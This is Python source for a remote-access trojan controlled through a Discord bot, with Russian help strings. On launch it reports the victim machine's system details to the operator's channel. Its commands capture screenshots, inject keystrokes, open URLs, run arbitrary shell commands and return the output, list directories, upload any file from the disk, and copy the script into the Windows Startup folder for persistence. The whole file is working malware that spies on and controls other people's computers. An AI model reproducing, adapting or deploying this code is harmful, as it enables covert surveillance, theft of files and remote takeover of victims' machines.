import pyautogui
import discord
from discord.ext import commands
import os
import sys
import platform
import webbrowser
import subprocess
import shutil
intents = discord.Intents.all()
client = commands.Bot(command_prefix='.', intents=intents)
id = 998279211276042414
# Nothing personal. It's just my job
@client.event
async def on_ready():
    channel = client.get_channel(id)
    if platform.system() == 'Windows':
        embed = discord.Embed(title='Victim', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
    elif platform.system() == 'Linux':
        embed = discord.Embed(title='victim', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
    elif platform.system() == 'Macos':
        embed = discord.Embed(title='Victim', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
    await channel.send(embed=embed)

@client.command(help='Скриншот экрана')
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    channel = client.get_channel(id)
    screenshot.save('screenshot.png')
    with open('screenshot.png', 'rb') as f:
        file = discord.File(f, filename='screenshot.png')
        await channel.send(file=file)
    os.remove('screenshot.png')
@client.command(help='Показать сообщение')
async def alert(ctx, *, message):
    channel = client.get_channel(id)
    pyautogui.alert(message)
    await channel.send('Send Alert Message!')

@client.command(help='Написать и отправить сообщение')
async def write(ctx, *, message):
    channel = client.get_channel(id)
    await channel.send("Writing")
    pyautogui.write(message)
    time.sleep(1)
    pyautogui.press('enter')
    await channel.send(f"I am Write and Send this message {message}")

@client.command(help='Скопировать текст')
async def copy_text(ctx):
    channel = client.get_channel(id)
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.hotkey('ctrl', 'c')
    await channel.send('I copy this text to clipboard')

@client.command(help='Вставить текст')
async def paste_text(ctx):
    pyautogui.hotkey('ctrl', 'v')
    pyautogui.press('enter')

@client.command(help='Открыть ссылку')
async def web(ctx, *, message):
    channel = client.get_channel(id)
    await channel.send(f'Open https://{message} wait')
    webbrowser.open("https://" + message)
    await channel.send(f"I am open https://{message} url")

@client.command(help='Информация о устройстве')
async def device(ctx):
    channel = client.get_channel(id)
    if platform.system() == 'Windows':
        embed = discord.Embed(title='Device info', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg/1161px-Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg.png")
    elif platform.system() == 'Linux':
        embed = discord.Embed(title='Device info', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/800px-Tux.svg.png")
    elif platform.system() == 'Macos':
        embed = discord.Embed(title='Device info', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
    await channel.send(embed=embed)

@client.command(help='Отключиться')
async def disconnected(ctx):
    channel = client.get_channel(id)
    pyautogui.alert(text='im disconnected', title='You are free', button='Bye')
    await channel.send('Disconnected')
    sys.exit(0)

@client.command(help="Ввод команды")
async def cmd(ctx, *, command):
    channel = client.get_channel(id)

    with open("console.txt", "w") as f:
        result = subprocess.run(command, stdout=f, stderr=f, shell=True, text=True)

    with open('console.txt', 'rb') as f:
        file = discord.File(f, filename='console.txt')
        await channel.send(file=file)
    os.remove('console.txt')

@client.command(help="Лист файлов")
async def ls(ctx, line):
    channel = client.get_channel(id)
    location = line.strip() or 'C:/'
    await channel.send(f"On folder {location} all files is : \n" + str(os.listdir(location)))

@client.command(help="Забрать файлы с диска")
async def up(ctx, *, message):
    channel = client.get_channel(id)
    await channel.send(file=discord.File(f"{message}"))

@client.command(help="Copy to AutoStart patch")
async def autostart(ctx):
	channel = client.get_channel(id)
	roaming = os.getenv("appdata")
	dst = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

	shutil.copy2(sys.argv[0], dst)

	await channel.send('Закинул скрипт в папку Авто Запуска')

client.run('Your Token')